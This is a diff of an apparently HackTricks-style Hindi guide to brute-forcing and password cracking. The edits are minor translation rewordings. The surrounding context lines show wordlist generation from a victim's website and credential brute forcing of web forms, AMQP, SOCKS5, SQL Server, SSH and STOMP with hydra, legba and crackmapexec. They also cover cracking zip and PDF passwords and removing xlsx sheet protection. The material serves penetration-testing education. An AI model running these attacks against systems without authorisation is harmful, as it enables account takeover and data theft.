@@ -19,9 +19,9 @@
 - [**https://many-passwords.github.io/**](https://many-passwords.github.io)
 - [**https://theinfocentric.com/**](https://theinfocentric.com/)
 
-## **अपने खुद के शब्दकोश बनाएं**
+## **अपनी खुद की डिक्शनरी बनाएं**
 
-लक्ष्य के बारे में जितनी संभव हो सके जानकारी प्राप्त करें और एक कस्टम शब्दकोश बनाएं। उपयोगी उपकरण:
+लक्ष्य के बारे में जितनी संभव हो सके जानकारी प्राप्त करें और एक कस्टम डिक्शनरी बनाएं। उपयोगी उपकरण:
 
 ### Crunch
 ```bash
@@ -34,7 +34,7 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 ^ Special characters including spac
 crunch 6 8 -t ,@@^^%%
 ```
-### वेबसाइट आधारित वर्डलिस्ट्स
+### वेबसाइट आधारित शब्दसूचियाँ
 ```bash
 # Cewl gets words from the victims page
 cewl example.com -m 5 -w words.txt
@@ -53,7 +53,7 @@ python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-एक वर्डलिस्ट जनरेटर टूल, जो आपको शब्दों का एक सेट प्रदान करने की अनुमति देता है, जिससे आपको दिए गए शब्दों से कई भिन्नताएँ बनाने की संभावना मिलती है, एक अद्वितीय और आदर्श वर्डलिस्ट बनाने के लिए जिसका उपयोग किसी विशेष लक्ष्य के संबंध में किया जा सके।
+एक शब्द सूची जनरेटर उपकरण, जो आपको शब्दों का एक सेट प्रदान करने की अनुमति देता है, जिससे आपको दिए गए शब्दों से कई भिन्नताएँ बनाने की संभावना मिलती है, एक अद्वितीय और आदर्श शब्द सूची बनाने के लिए जिसका उपयोग एक विशिष्ट लक्ष्य के संबंध में किया जा सके।
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -89,7 +89,7 @@ Finished in 0.920s.
 
 ## Services
 
-सेवा नाम के अनुसार वर्णानुक्रम में व्यवस्थित।
+सेवा नाम के अनुसार वर्णानुक्रम में व्यवस्थित। 
 
 ### AFP
 ```bash
@@ -105,7 +105,7 @@ msf> run
 ```bash
 nmap --script ajp-brute -p 8009 <IP>
 ```
-## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM और Solace)
+### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM और Solace)
 ```bash
 legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
 ```
@@ -156,7 +156,7 @@ legba http.ntlm2 --domain example.org --workstation client --username admin --pa
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-http**s** के लिए आपको "http-post-form" से "**https-post-form" में बदलना होगा।
+http**s** के लिए आपको "http-post-form" से "**https-post-form" में बदलना होगा**
 
 ### **HTTP - CMS --** (W)ordpress, (J)oomla या (D)rupal या (M)oodle
 ```bash
@@ -381,7 +381,7 @@ legba socks5 --target localhost:1080 --username admin --password data/passwords.
 # With alternative address
 legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
 ```
-### SQL Server
+### SQL सर्वर
 ```bash
 #Use the NetBIOS name of the machine as domain
 crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
@@ -406,7 +406,7 @@ legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --targ
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ और OpenMQ)
 
-STOMP टेक्स्ट प्रोटोकॉल एक व्यापक रूप से उपयोग किया जाने वाला मैसेजिंग प्रोटोकॉल है जो **लोकप्रिय संदेश कतार सेवाओं** जैसे RabbitMQ, ActiveMQ, HornetQ, और OpenMQ के साथ निर्बाध संचार और इंटरैक्शन की अनुमति देता है। यह संदेशों का आदान-प्रदान करने और विभिन्न मैसेजिंग संचालन करने के लिए एक मानकीकृत और कुशल दृष्टिकोण प्रदान करता है।
+STOMP टेक्स्ट प्रोटोकॉल एक व्यापक रूप से उपयोग किया जाने वाला मैसेजिंग प्रोटोकॉल है जो **लोकप्रिय मैसेज कतार सेवाओं** जैसे RabbitMQ, ActiveMQ, HornetQ, और OpenMQ के साथ निर्बाध संचार और इंटरैक्शन की अनुमति देता है। यह संदेशों का आदान-प्रदान करने और विभिन्न मैसेजिंग संचालन करने के लिए एक मानकीकृत और कुशल दृष्टिकोण प्रदान करता है।
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -480,7 +480,7 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 ```
 #### ज्ञात प्लेनटेक्स्ट ज़िप हमला
 
-आपको **एन्क्रिप्टेड ज़िप के अंदर** एक फ़ाइल का **प्लेनटेक्स्ट** (या प्लेनटेक्स्ट का एक भाग) जानना आवश्यक है। आप **एन्क्रिप्टेड ज़िप के अंदर शामिल फ़ाइलों के फ़ाइल नाम और आकार** की जांच कर सकते हैं: **`7z l encrypted.zip`**\
+आपको **एन्क्रिप्टेड ज़िप के अंदर** एक फ़ाइल का **प्लेनटेक्स्ट** (या प्लेनटेक्स्ट का एक भाग) जानना आवश्यक है। आप एन्क्रिप्टेड ज़िप के अंदर **फ़ाइलों के नाम और फ़ाइलों के आकार** की जांच कर सकते हैं: **`7z l encrypted.zip`**\
 [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) को रिलीज़ पृष्ठ से डाउनलोड करें।
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -515,7 +515,7 @@ qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
 ### PDF Owner Password
 
-PDF Owner पासवर्ड को क्रैक करने के लिए यह देखें: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+PDF Owner पासवर्ड क्रैक करने के लिए यह देखें: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -595,7 +595,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 यदि आपके पास एक xlsx फ़ाइल है जिसमें एक कॉलम पासवर्ड द्वारा सुरक्षित है, तो आप इसे अनलॉक कर सकते हैं:
 
 - **इसे गूगल ड्राइव पर अपलोड करें** और पासवर्ड स्वचालित रूप से हटा दिया जाएगा
-- **मैन्युअल रूप से** इसे **हटाने के लिए**:
+- **हाथ से** इसे **हटाने के लिए**:
 ```bash
 unzip file.xlsx
 grep -R "sheetProtection" ./*
